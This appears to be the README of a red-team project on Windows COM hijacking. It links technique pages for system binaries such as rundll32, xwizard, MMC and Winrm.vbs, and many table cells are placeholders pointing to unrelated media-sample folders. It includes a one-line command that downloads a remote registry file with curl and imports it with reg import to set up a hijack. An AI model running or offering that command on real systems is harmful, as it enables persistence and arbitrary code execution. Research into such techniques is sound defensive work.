# ReaCOM project

<table>
 <tr>
  <td><a href="Classes/Runonce.md">Runonce.exe/COM Hijacking</a></td>
  <td><a href="Classes/URLProtocol.md">URLProtocol/COMHijacking</a></td>
  <td><a href="Classes/Signature-Tools/Openwith.md">Openwith.exe/COMHijacking</a></td>
  <td><a href="Classes/rundll32.md">Rundll32/CLSID</a></td>
 </tr>
 <tr>
  <td><a href="Classes/xwizard.md">xwizard/CLSID</a></td>
  <td><a href="Classes/xwizards.dll.md">DLL/CLSID</a></td>
  <td><a href="Classes/mmc.md">MMC/CLSID</a></td>
 </tr>
 <tr>
  <td><a href="Classes/Signature-Tools/explorer.md">Explorer.exe/COMHijacking</a></td>
  <td><a href="Classes/COMScripetlet.reg">Scripetlet/File</a></td>
  <td><a href="Classes/Powershell.md">Powershell/CLSID</a></td>
 </tr>
 <tr>  
  <td><a href="Classes/Verclsid.md">Verclsid.exe</a></td>
  <td><a href="Classes/Winrm.md">Winrm.vbs</a></td>
  <td><a href="Classes/Winrm.md">Winrm.cmd</a></td>
 </tr>
 <tr>
  <td><a href="Classes/prncnfg.md">Prncnfg.vbs</a></td>
  <td><a href="Classes/prnport.md">Prnport.vbs</a></td>
  <td><a href="Samples/CameraProfile">Being implmented</a></td>
 </tr>
 <tr>
  <td><a href="Samples/CameraResolution">Being implmented</a></td>
  <td><a href="Samples/CameraStreamCoordinateMapper">Being implmented</a></td>
  <td><a href="Samples/CameraStreamCorrelation">Being implmented</a></td>
 </tr>
 <tr>
  <td><a href="Samples/LiveDash">Being implmented</a></td>
  <td><a href="Samples/D2DPhotoAdjustment">Being implmented</a></td>
  <td><a href="Samples/MediaEditing">Being implmented</a></td>
 </tr>
 <tr>
  <td><a href="Samples/MediaImport">Being implmented</a></td>
  <td><a href="Samples/XamlCustomMediaTransportControls">Being implmented</a></td>
  <td><a href="Samples/MIDI">Being implmented</a></td>
 </tr>
 <tr>
  <td><a href="Samples/Playlists">Being implmented</a></td>
  <td><a href="Samples/PlayReady">Being implmented</a></td>
  <td><a href="Samples/CameraOpenCV">Being implmented</a></td>
 </tr>
 <tr>
  <td><a href="Samples/SimpleImaging>Being implmented</a></td>
  <td><a href="Samples/SpatialSound">Being implmented</a></td>
  <td><a href="Samples/SystemMediaTransportControls">Being implmented</a></td>
 </tr>

</table>
   
  ### ReaCOM  
ReaCOM is the project that has a multiple of contributes to understand component object model. It provides you more than one tool to use COM. This project is based on Scriptlet, which it means, All of the tools that you would like to use from my project are based on Scriptllet execution.



ReaCOM targets COM techniques from different types of use and shows some research from different authors, COM object is one of the most popular techniques for the red team in twitter and everywhere, so that we are all here to show some tools can do hijacking COM objects and execute its code by abusing some tools in system operating.
 

### Ackknowledgement
* [Bohops](https://twitter.com/bohops)
* [Matt Nelson ](https://twitter.com/enigma0x3)

* [Casey Smith](https://twitter.com/subTee)


### General Acknowledgement
Thanks everyone for working together to find these great tools.



* [Start using COM technique after watching this](![GIF](https://user-images.githubusercontent.com/25440152/59564365-c880f000-8ffa-11e9-914d-d974baf5dfbc.gif)
)



To enjoy hijacking you need to do the steps below:
* Downloading registry file
* Importing registry file
* Taking a look and learning how Scriptlet works.

![GIF](https://user-images.githubusercontent.com/25440152/59564365-c880f000-8ffa-11e9-914d-d974baf5dfbc.gif)

The command used in the gif is below:
```
curl.exe --remote-time https://raw.githubusercontent.com/homjxi0e/ReaCOM/master/Classes/COMScripetlet.reg --write-out rrr.reg --output tttt.reg; echo '' '' ; reg import .\tttt.reg

```
### (Useful references)
* Helpful techniques can help you to know how to use these project tools.
* [URL Protocol](https://msdn.microsoft.com/en-us/windows/desktop/aa767914)

* Part 1 [COM component object model](https://docs.microsoft.com/en-us/windows/desktop/com/component-object-model--com--portal) :)
* Part 2 [COM component object model ](https://docs.microsoft.com/en-us/windows/desktop/com/the-component-object-model) :)
